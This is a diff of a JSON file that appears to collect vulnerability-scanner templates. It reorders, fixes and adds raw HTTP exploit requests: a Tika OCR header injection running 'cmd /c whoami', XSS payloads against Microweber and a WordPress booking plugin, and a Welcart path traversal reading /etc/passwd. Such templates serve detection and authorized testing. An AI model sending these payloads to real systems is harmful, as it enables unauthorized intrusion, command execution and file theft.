@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -19683,7 +19683,7 @@
     {
       "id": "CVE-2022-0928",
       "info": {
-        "name": "Microweber <1.2.12 - Stored Cross-Site Scripting",
+        "name": "Microweber < 1.2.12 - Stored Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -19691,7 +19691,7 @@
           "raw": [
             "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "POST /api/shop/save_tax_item HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: {{BaseURL}}/admin/view:settings\n\nid=0&name=vat1&type=\"><img+src%3dx+onerror%3dalert(document.domain)>&rate=10\n",
-            "POST /module HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer:{{BaseURL}}/admin/view:settings\n\nclass=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes"
+            "POST /module HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer:{{BaseURL}}/admin/view:settings\n\nclass=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes\n"
           ]
         }
       ]
@@ -19756,6 +19756,21 @@
             "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /admin/view:modules/load_module:users/edit-user:2 HTTP/1.1\nHost: {{Hostname}}\n",
             "POST /api/user/2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nthumbnail=&id=2&token={{form_token}}&_method=PATCH&username={{user}}&verify_password=&first_name={{payload}}&last_name=test&email={{email}}&phone=&is_admin=0&is_active=1&basic_mode=0&api_key=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1007",
+      "info": {
+        "name": "Advanced Booking Calendar < 1.7.1 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php?page=advanced-booking-calendar-show-seasons-calendars&setting=changeSaved&room=1111%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -22429,6 +22444,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/search/?q=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-41840",
+      "info": {
+        "name": "Welcart eCommerce <= 2.7.7 - Unauth Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
